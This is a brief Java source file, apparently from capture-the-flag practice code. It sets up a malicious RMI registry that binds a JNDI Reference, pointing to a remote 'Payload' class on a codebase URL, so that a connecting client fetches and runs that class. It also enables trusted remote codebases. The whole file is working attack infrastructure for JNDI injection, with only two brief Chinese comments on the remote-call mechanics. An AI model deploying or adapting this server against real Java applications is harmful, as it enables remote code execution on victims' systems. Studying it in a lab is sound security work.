package com.ctfjava.main;

import com.ctfjava.main.impl.RMItesttmpl;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIserver2 {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {
        TestRMI testRMI=new RMItesttmpl();
        Registry registry= LocateRegistry.createRegistry(8088);
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");//支持远程连接
        Reference reference=new Reference("Payload","Payload","http://localhost/");
        //ReferenceWrapper适配器调用了一个remote远程调用接口，用来完成远程调用
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
        registry.bind("hello",referenceWrapper);
        System.out.println("server is start");
    }
}
